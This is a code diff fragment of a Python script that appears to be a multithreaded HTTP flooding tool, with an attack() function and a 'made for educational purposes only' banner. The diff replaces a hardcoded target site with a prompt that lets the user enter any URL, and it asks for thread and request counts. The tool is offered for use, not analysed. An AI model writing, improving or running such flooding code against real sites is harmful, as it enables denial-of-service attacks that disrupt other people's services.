@@ -1,3 +1,5 @@
+#!/bin/python3
+
 import time, random, threading, requests
 
 start_time = time.time()
@@ -17,7 +19,7 @@ def attack():
           
 if __name__ == "__main__":
     print("Proxy scraper + randomised useragents coming soon! :tm:\nMade for educational purposes only | nasus#5311\n")
-    url = "http://www.font.ir"
+    url = input("Enter Url: ")
     num_threads = int(input("threads: "))
     num_requests = int(input("requests per thread: "))
     url = url + str(random.randint(0, 100))
